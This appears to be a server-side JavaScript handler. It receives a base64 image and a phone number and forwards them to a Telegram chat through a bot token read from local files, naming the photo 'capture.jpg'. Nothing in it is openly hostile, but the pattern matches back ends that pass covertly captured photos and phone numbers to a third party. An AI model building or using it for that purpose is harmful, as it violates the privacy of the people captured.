import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { image, phone } = req.body;
    if (!image) {
        return res.status(400).json({ error: 'No image provided' });
    }

    // Read token and uid from files
    const rootDir = path.join(process.cwd());
    const token = fs.readFileSync(path.join(rootDir, 'token.txt'), 'utf8').trim();
    const uid = fs.readFileSync(path.join(rootDir, 'uid.txt'), 'utf8').trim();

    const TELEGRAM_API = `https://api.telegram.org/bot${token}`;
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');

    try {
        const form = new FormData();
        form.append('chat_id', uid);
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
        form.append('caption', `Phone: ${phone || 'Unknown'}`);

        const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        if (!response.ok) {
            throw new Error(`Telegram error: ${response.statusText}`);
        }

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
}
